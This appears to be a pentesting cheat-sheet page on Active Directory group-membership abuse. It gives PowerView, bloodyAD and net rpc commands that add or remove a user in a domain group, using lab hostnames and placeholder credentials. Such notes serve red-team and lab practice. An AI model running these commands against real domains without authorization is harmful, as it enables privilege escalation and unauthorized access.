# AddMember

## <mark style="color:yellow;">PowerView</mark>

### <mark style="color:blue;">Check membership</mark>

```powershell
PS C:\> Get-ADGroup -Identity "NC Agents" -Properties * | Select -ExpandProperty Members
```

### <mark style="color:blue;">Adding user to group</mark>

<mark style="color:orange;">**PowerView Required!**</mark>

```powershell
PS C:\> Add-DomainGroupMember -Identity 'NC Agents' -Members 'songbird' -Credential $Cred -Verbose
```

### <mark style="color:blue;">Deleting user from group</mark>

```powershell
PS C:\> Remove-DomainGroupMember -Identity "NC Agents" -Members 'songbird' -Credential $Cred -Verbose
```

## <mark style="color:yellow;">BloodyAD</mark>

> We can add user to group with BloodyAD tool.&#x20;

```bash
bloodyAD --host 13.13.13.13 -d militech.local -u songbird -p 'Password123' add groupMember 'NC Agents' 'songbird'
```

## <mark style="color:yellow;">NET</mark>

```powershell
net rpc group addmem "NC Agents" "s.reed" -U "MILITECH.LOCAL"/"s.reed"%"Password123" -S "13.13.13.13"
```
